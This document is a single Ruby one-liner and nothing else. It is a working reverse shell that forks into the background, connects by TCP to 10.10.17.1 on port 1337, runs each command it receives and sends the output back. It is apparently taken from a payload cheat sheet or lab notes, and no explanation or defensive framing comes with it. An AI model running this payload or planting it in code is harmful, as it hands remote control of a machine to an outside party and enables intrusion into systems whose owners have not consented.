ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.17.1","1337");
while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
